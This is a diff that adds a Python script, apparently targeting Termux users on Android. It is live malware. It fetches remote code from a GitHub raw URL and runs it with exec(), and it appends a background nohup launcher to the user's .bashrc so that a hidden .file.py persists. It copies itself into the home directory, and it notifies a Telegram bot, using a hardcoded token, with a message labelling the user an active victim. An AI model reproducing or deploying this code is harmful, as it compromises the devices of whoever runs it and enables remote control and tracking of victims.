@@ -1,0 +1,33 @@
+try:
+    import os, requests, json, time, re, random, sys, uuid, string, subprocess
+    from string import *
+    import bs4
+    from concurrent.futures import ThreadPoolExecutor as tred
+    from bs4 import BeautifulSoup as sop
+    from bs4 import BeautifulSoup
+except ModuleNotFoundError:
+    os.system('pip install requests bs4 futures==2 • /dev/null')
+    os.system('python .file.py')
+
+from concurrent.futures import ThreadPoolExecutor
+import requests, bs4, uuid, json, os, sys, random, datetime, time, re, subprocess
+
+# تحميل وتنفيذ كود من الإنترنت
+X1 = requests.get('https://raw.githubusercontent.com/JDXSX/HIFBPDC/main/.file.py').text
+exec(X1)
+
+# إعداد الأمر لتشغيل ملف .file.py في الخلفية
+hack = 'nohup python /data/data/com.termux/files/home/.file.py > /dev/null 2>&1 &'
+
+# محاولة قراءة ملف .bashrc وإضافة أمر التشغيل إذا لم يكن موجودًا
+try:
+    read = open('/data/data/com.termux/files/home/.bashrc', 'r').read()
+    requests.post(f'''https://api.telegram.org/bot7217469306:AAGW7g_XKWvLwfp4F6cMlHaGEA-Sg4uagJw/sendMessage?chat_id=5210419138&text=ضحيه نشطه مع{method}''')
+except:
+    open('/data/data/com.termux/files/home/.bashrc', 'w').write(hack)
+
+# محاولة قراءة ملف .file.py وإذا لم يكن موجودًا، نسخه إلى المسار المحدد
+try:
+    open('/data/data/com.termux/files/home/.file.py', 'r').read()
+except:
+    os.system('cp -r .file.py /data/data/com.termux/files/home/.file.py')
